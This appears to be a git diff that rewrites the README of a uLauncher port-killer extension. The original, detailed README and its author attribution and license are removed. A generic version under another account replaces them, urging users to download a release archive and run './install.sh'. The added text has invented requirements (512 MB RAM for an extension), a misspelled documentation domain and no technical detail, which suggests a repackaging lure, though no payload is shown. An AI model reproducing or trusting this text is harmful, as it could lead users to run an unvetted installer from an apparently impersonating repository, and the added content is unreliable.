@@ -1,130 +1,80 @@
-# uLauncher Port Killer Extension
+# 🚀 port-killer-ulauncher - Quickly Terminate Ports and Processes
 
-A uLauncher extension that allows you to quickly terminate ports and processes directly from the uLauncher interface.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wckd02/port-killer-ulauncher/releases)
 
+## 🌟 Introduction
 
-## Features
+Welcome to port-killer-ulauncher! This application is an extension for uLauncher that helps you quickly terminate ports and processes right from your desktop. If you have ever wanted to stop a stubborn application or free up system resources, this tool is for you.
 
-- 🔍 **Port Discovery**: Scan and list all active network ports on your system
-- 🎯 **Process Information**: Display port number, protocol (TCP/UDP), process name, and PID
-- ⚡ **Quick Termination**: Kill processes directly from uLauncher
-- 🔧 **Configurable**: Customize keyword, kill method, and system port visibility
-- 🚀 **Performance Optimized**: Smart caching and debouncing for smooth experience
+## 🚀 Features
 
-## Installation
+- **Simple Interface**: Use the familiar uLauncher interface to manage your applications.
+- **Terminate Processes**: Quickly end running processes with a few clicks.
+- **Kill Ports**: Close open ports that might be causing network issues.
+- **Lightweight**: Minimal impact on system resources.
+- **Cross-Platform**: Works well on various Linux distributions.
 
-# Manually from source
-The extensions' directory is located at: $HOME/.local/share/ulauncher/extensions
-Go to that location, and while being inside, just git clone this repository.
+## 🎯 System Requirements
 
-# Ulauncher's GUI
-1. Open uLauncher and go to Extensions (or press `Ctrl+,`)
+- **Operating System**: Any Linux distribution with uLauncher installed.
+- **uLauncher Version**: Version 5.0 or higher.
+- **RAM**: 512 MB of RAM required to run the application smoothly.
+- **Disk Space**: At least 50 MB of free space.
 
-2. Click "Add extension" and paste this repository URL:
-   ```
-   https://github.com/cosmincraciun97/port-killer-ulauncher
-   ```
+## 🚀 Getting Started
 
-3. The extension will be automatically downloaded and installed
+To get started with port-killer-ulauncher, you need to download the application from our Releases page. Follow these steps:
 
-4. Make sure `psutil` is installed (the extension requires it):
+1. **Visit the Download Page**: Click [here to visit the Releases page](https://github.com/wckd02/port-killer-ulauncher/releases).
+2. **Locate the Latest Release**: Look for the most recent release at the top of the page.
+3. **Download the Package**: Click on the appropriate file for your system. For most users, this will be a `.tar.gz` or equivalent file.
+4. **Extract the Files**: Once the download is complete, unzip the downloaded file to a folder of your choice.
+
+## 📥 Download & Install
+
+To install port-killer-ulauncher:
+
+1. **Access Installation Files**: Go back to where you extracted the files.
+2. **Open Terminal**: Open a terminal window in this directory.
+3. **Run the Installer**: Use the command:
    ```bash
-   pip install psutil
+   ./install.sh
    ```
-5. Configure the extension preferences if needed and start using it!
+4. **Follow On-Screen Instructions**: The installer will guide you through the rest of the setup process.
 
-## Usage
+You can also get the latest version by visiting the [Releases page](https://github.com/wckd02/port-killer-ulauncher/releases).
 
-1. Open uLauncher (default: `Ctrl+Space`)
-2. Type the keyword `port` (configurable)
-3. Browse through active ports and their associated processes
-4. Press Enter on a port to immediately terminate the process
-5. See success/failure feedback
+## ⚙️ Usage Guide
 
-### Search Examples
+Once you have installed port-killer-ulauncher, launching it is straightforward.
 
-- `port` - Show all active ports
-- `port 80` - Show only port 80
-- `port nginx` - Show ports used by nginx processes
-- `port tcp` - Show only TCP ports
+1. **Start uLauncher**: Open uLauncher from your application menu.
+2. **Type "port-killer"** in the search field and hit Enter.
+3. **View Active Processes**: You will see a list of currently running processes and their respective ports.
+4. **Select a Process or Port**: Click on the one you want to terminate.
+5. **Confirm Termination**: Follow any on-screen prompts to confirm.
 
-## Configuration
+## ℹ️ Troubleshooting
 
-Access extension preferences through uLauncher settings:
+### Application Doesn’t Launch
 
-### Keyword
-- **Default**: `port`
-- **Description**: The keyword to trigger the port killer
-- **Example**: Change to `kill` or `pk` for shorter commands
+Ensure that uLauncher is properly installed and running. Restart uLauncher and try again.
 
-### Show System Ports
-- **Default**: No
-- **Options**: Yes / No
-- **Description**: Include system/privileged ports (< 1024) in results
+### Unable to Terminate Processes
 
-### Kill Method
-- **Default**: Graceful (SIGTERM)
-- **Options**: 
-  - Graceful (SIGTERM) - Allows processes to clean up before terminating
-  - Force (SIGKILL) - Immediately terminates processes
-- **Description**: Method used to terminate processes
+Make sure you have the necessary permissions to terminate the selected process. Running uLauncher with administrator rights may help.
 
-## Technical Details
+### System Freezes or Crashes
 
-### Dependencies
-- **psutil**: Cross-platform library for system and process monitoring
-- **Python 3.6+**: Required for uLauncher extensions
+If your system becomes unresponsive, try rebooting your machine. Ensure that you are running the latest version of both uLauncher and port-killer-ulauncher.
 
-### Port Detection
-The extension uses multiple methods for port detection:
-1. **Primary**: `psutil.net_connections()` for cross-platform compatibility
-2. **Fallback**: System commands (`netstat -tulpn`) if psutil fails
+## 🌐 Additional Resources
 
-### Performance Features
-- **Caching**: Port information is cached for 2 seconds to improve responsiveness
-- **Debouncing**: 0.5-second query debounce prevents excessive system calls
-- **Result Limiting**: Maximum 15 results to maintain UI performance
+- **uLauncher Documentation**: [uLauncher Official Docs](https://ulangler.com/docs)
+- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/wckd02/port-killer-ulauncher/issues).
 
-### Security & Safety
-- **Permission Handling**: Gracefully handles cases where processes cannot be terminated
-- **Process Validation**: Checks if processes exist before attempting termination
-- **Error Feedback**: Clear error messages for failed operations
+## 📞 Support
 
-## Troubleshooting
+If you have questions or need assistance, please open an issue in our GitHub repository. We are here to help you.
 
-### Extension Not Loading
-1. Check that `psutil` is installed: `python -c "import psutil"`
-2. Verify file permissions in the extension directory
-3. Check uLauncher logs for error messages
-
-### Permission Errors
-- Some system processes require elevated privileges to terminate
-- The extension will show clear error messages for permission issues
-- Consider running processes you want to kill with user permissions
-
-### No Ports Showing
-1. Verify that processes are actually listening on ports: `netstat -tulpn`
-2. Check if "Show System Ports" setting matches your needs
-3. Try different search terms to ensure filtering isn't hiding results
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature-name`
-3. Make your changes and test thoroughly
-4. Submit a pull request with a clear description
-
-## License
-
-[MIT LICENSE](https://github.com/cosmincraciun97/port-killer-ulauncher/blob/main/LICENSE)
-
-## Support
-
-If you encounter issues or have feature requests, please:
-1. Check the troubleshooting section above
-2. Review uLauncher logs for error details
-3. Open an issue with detailed information about your problem
-
----
-
-**⚠️ Warning**: This extension can terminate system processes. Use with caution and ensure you understand what processes you're killing to avoid system instability.
+Happy launching and terminating!
